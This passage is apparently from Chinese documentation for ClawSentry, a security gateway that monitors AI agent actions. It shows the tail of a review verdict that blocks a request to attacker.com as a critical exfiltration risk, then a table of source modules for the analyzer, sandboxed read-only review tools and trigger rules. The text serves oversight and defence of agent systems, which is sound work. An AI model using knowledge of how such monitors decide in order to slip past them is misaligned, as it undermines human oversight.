    "目标 URL (attacker.com) 不在项目的合法外部服务列表中"
  ],
  "confidence": 0.98
}
```

**最终结果：** CRITICAL / BLOCK，完整推理轨迹持久化到 TrajectoryStore。

---

## 代码位置 {#source-code}

| 模块 | 路径 | 职责 |
|------|------|------|
| AgentAnalyzer | `src/clawsentry/gateway/agent_analyzer.py` | L3 核心引擎：单轮/多轮模式、Prompt 构建、响应解析 |
| ReadOnlyToolkit | `src/clawsentry/gateway/review_toolkit.py` | 7 个只读工具 + 路径沙箱 + 调用预算 |
| SkillRegistry | `src/clawsentry/gateway/review_skills.py` | YAML 技能加载、验证和匹配选择 |
| L3TriggerPolicy | `src/clawsentry/gateway/l3_trigger.py` | 确定性触发条件判断 |
| 内置技能 YAML | `src/clawsentry/gateway/skills/*.yaml` | 6 个内置审查技能定义 |
| LLM 工厂 | `src/clawsentry/gateway/llm_factory.py` | `build_analyzer_from_env()` 自动构建含 L3 的分析器链 |
